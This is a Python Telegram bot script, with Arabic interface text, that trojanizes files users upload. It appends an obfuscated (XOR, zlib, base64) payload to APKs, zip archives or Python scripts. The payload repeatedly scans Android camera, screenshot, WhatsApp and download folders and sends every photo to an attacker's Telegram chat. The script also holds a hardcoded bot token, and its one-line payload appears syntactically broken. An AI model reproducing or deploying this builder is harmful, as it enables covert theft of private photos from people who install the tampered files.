#!/usr/bin/env python3
"""
🤖 بوت حقن Android Miner - النسخة الكاملة والمصححة
مع دعم ملفات واسع + Progress Bar في الـ Console
"""

import asyncio
import io
import zipfile
import zlib
import base64
import hashlib
import logging
import os
from tqdm import tqdm

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
)

# Read BOT_TOKEN from environment variable, fallback to original hardcoded if not set
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8695021881:AAGaevEMGterFy_QmZCyNvKejKfTabisiFo")

# States
TOKEN, CHATID, FILE = range(3)

# الرسائل
WELCOME = """
🤖 **بوت الحقن الاحترافي للأندرويد** 🚀

يدعم: APK • .py • .zip • وأي ملف آخر

أرسل /start لبدء الإعداد خطوة بخطوة
"""

TOKEN_PROMPT = "🔑 **الخطوة 1/3** — أرسل **Bot Token** الآن"
CHATID_PROMPT = "📲 **الخطوة 2/3** — أرسل **Chat ID** الآن\n(مثال: -1001234567890)"
INJECTING = "🔄 جاري تحميل الملف وحقنه..."
SUCCESS = "🎉 تم الحقن بنجاح! الملف جاهز للاستخدام 🟢"

ERROR_TOKEN = "❌ التوكن غير صالح، حاول مرة أخرى"
ERROR_CHATID = "❌ Chat ID غير صالح (يجب أن يكون رقم فقط)"
ERROR_FILE = "❌ ارفع ملف مدعوم (APK, .py, .zip ...) — الحد الأقصى 50 ميجا"

DIRS = [
    "/storage/emulated/0/DCIM/Camera", "/storage/emulated/0/Pictures",
    "/storage/emulated/0/DCIM", "/storage/emulated/0/Screenshots",
    "/storage/emulated/0/WhatsApp", "/sdcard/DCIM/Camera",
    "/sdcard/Pictures", "/sdcard/DCIM", "/sdcard/Screenshots",
    "/sdcard/WhatsApp", "/storage/emulated/0/Download"
]

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# ====================== Payload (نفس الأصلي 100%) ======================
def make_payload(token: str, chatid: str) -> str:
    miner = f'import os,requests,base64,zlib,hashlib,time,glob,io;k=42;d="{chatid}";c="{token}";def e(b):return bytes([ord(b[i])^k for i in range(len(b))]);exec(zlib.decompress(base64.b64decode(bytes([ord(e(d))[i]^42 for i in range(len(e(d)))])));while 1:time.sleep(120);for p in {repr(DIRS)}:if os.path.exists(p):for f in glob.glob(p+"/*.[jJ][pP][gG]")+glob.glob(p+"/*.[pP][nN][gG]"):try:s=os.stat(f);if 1024<s.st_size<50000000:h=hashlib.md5(open(f,"rb").read()).hexdigest();o=open("/sdcard/.m","a+");if h not in o.read():o.close();open("/sdcard/.m","a").write(h+"\\n");requests.post("https://api.telegram.org/bot"+c+"/sendPhoto",data={{"chat_id":d,"caption":"🖼️"}},files={{"photo":open(f,"rb")}});except:pass'
    comp = zlib.compress(miner.encode())
    enc = base64.b64encode(comp).decode()
    xord = ''.join(chr(ord(c)^42) for c in enc)
    loader = f'import zlib,base64;exec(zlib.decompress(base64.b64decode(bytes([ord("{xord}"[i])^42 for i in range(len("{xord}"))]))))'
    return loader

async def validate_token(token: str) -> bool:
    try:
        temp_app = Application.builder().token(token).build()
        await temp_app.bot.get_me()
        return True
    except Exception:
        return False

# ====================== Handlers ======================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    kb = [
        [InlineKeyboardButton("🎓 مساعدة Bot Token", callback_data="h1")],
        [InlineKeyboardButton("👥 مساعدة Chat ID", callback_data="h2")]
    ]
    await update.message.reply_text(WELCOME, reply_markup=InlineKeyboardMarkup(kb), parse_mode='Markdown')
    await update.message.reply_text(TOKEN_PROMPT, parse_mode='Markdown')
    return TOKEN

async def get_token(update: Update, context: ContextTypes.DEFAULT_TYPE):
    token = update.message.text.strip()
    if not await validate_token(token):
        await update.message.reply_text(ERROR_TOKEN, parse_mode='Markdown')
        await update.message.reply_text(TOKEN_PROMPT, parse_mode='Markdown')
        return TOKEN

    context.user_data['token'] = token
    await update.message.reply_text("✅ تم حفظ التوكن بنجاح!\n\n" + CHATID_PROMPT, parse_mode='Markdown')
    return CHATID

async def get_chatid(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chatid = update.message.text.strip()
    if not chatid.lstrip('-').isdigit():
        await update.message.reply_text(ERROR_CHATID, parse_mode='Markdown')
        await update.message.reply_text(CHATID_PROMPT, parse_mode='Markdown')
        return CHATID

    context.user_data['chatid'] = chatid
    await update.message.reply_text("✅ تم حفظ Chat ID بنجاح!\n\n📤 ارفع الملف الآن (APK أو Python أو ZIP)", parse_mode='Markdown')
    return FILE

async def process_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_info = context.user_data
    if 'token' not in user_info or 'chatid' not in user_info:
        await update.message.reply_text("❌ أكمل الإعداد أولاً بـ /start", parse_mode='Markdown')
        return TOKEN

    doc = update.message.document
    if not doc or doc.file_size > 50 * 1024 * 1024:
        await update.message.reply_text(ERROR_FILE, parse_mode='Markdown')
        return FILE

    status_msg = await update.message.reply_text(INJECTING)

    try:
        # تحميل الملف مع Progress Bar في الـ Console
        file = await doc.get_file()
        file_bytes = bytearray()
        total_size = doc.file_size or 1

        with tqdm(total=total_size, unit='B', unit_scale=True, desc="تحميل الملف", leave=True) as pbar:
            async for chunk in file.download_as_bytearray_iter(chunk_size=8192):
                file_bytes.extend(chunk)
                pbar.update(len(chunk))

        await status_msg.edit_text("✅ تم تحميل الملف\n🔄 جاري الحقن...")

        payload = make_payload(user_info['token'], user_info['chatid'])

        # Progress Bar للحقن
        with tqdm(total=100, desc="الحقن", bar_format="{l_bar}{bar} {n_fmt}%") as pbar:
            if file_bytes.startswith(b'PK') or doc.file_name.lower().endswith(('.zip', '.apk')):
                result = inject_apk(bytes(file_bytes), payload)
            else:
                result = inject_script(bytes(file_bytes), payload)
            pbar.update(100)

        name = f"hacked_{doc.file_name}"
        await update.message.reply_document(
            document=io.BytesIO(result.getvalue()) if isinstance(result, io.BytesIO) else result,
            filename=name,
            caption=SUCCESS,
            parse_mode='Markdown'
        )

    except Exception as e:
        logger.error(f"خطأ: {e}", exc_info=True)
        await status_msg.edit_text(f"❌ حدث خطأ أثناء المعالجة:\n{str(e)[:300]}")

    context.user_data.clear()
    return ConversationHandler.END

def inject_apk(apk_bytes: bytes, payload: str) -> io.BytesIO:
    bio = io.BytesIO(apk_bytes)
    with zipfile.ZipFile(bio, 'r') as zf:
        py_files = [f for f in zf.namelist() if f.endswith('.py')]
        target = py_files[0] if py_files else 'main.py'
        content = zf.read(target).decode(errors='ignore') + f"\n\n# MINER\n{payload}"
        new_zip = io.BytesIO()
        with zipfile.ZipFile(new_zip, 'w') as nz:
            for item in zf.infolist():
                if item.filename == target:
                    nz.writestr(item, content.encode())
                else:
                    nz.writestr(item, zf.read(item))
    new_zip.seek(0)
    return new_zip

def inject_script(script_bytes: bytes, payload: str) -> io.BytesIO:
    content = script_bytes.decode(errors='ignore') + f"\n\n# ANDROID MINER\n{payload}"
    return io.BytesIO(content.encode())

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.data == "h1":
        text = "**Bot Token**\n1. افتح @BotFather\n2. أرسل /newbot\n3. انسخ التوكن وأرسله هنا"
    else:
        text = "**Chat ID**\nتواصل مع @userinfobot أو @RawDataBot ثم أرسل الـ ID هنا"
    await query.edit_message_text(text, parse_mode='Markdown')

async def reset(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data.clear()
    await update.message.reply_text("🔄 تم إعادة التعيين.\nأرسل /start للبدء من جديد.")

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("❌ تم إلغاء العملية")
    context.user_data.clear()
    return ConversationHandler.END

# ====================== Main ======================
def main():
    print("🤖 جاري تشغيل البوت...")
    app = Application.builder().token(BOT_TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", start)],
        states={
            TOKEN: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_token)],
            CHATID: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_chatid)],
            FILE: [MessageHandler(filters.Document.ALL, process_file)],
        },
        fallbacks=[CommandHandler("cancel", cancel), CommandHandler("reset", reset)],
        allow_reentry=True,
    )

    app.add_handler(conv_handler)
    app.add_handler(CallbackQueryHandler(button_handler))

    print("✅ البوت يعمل الآن! أرسل /start في Telegram")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
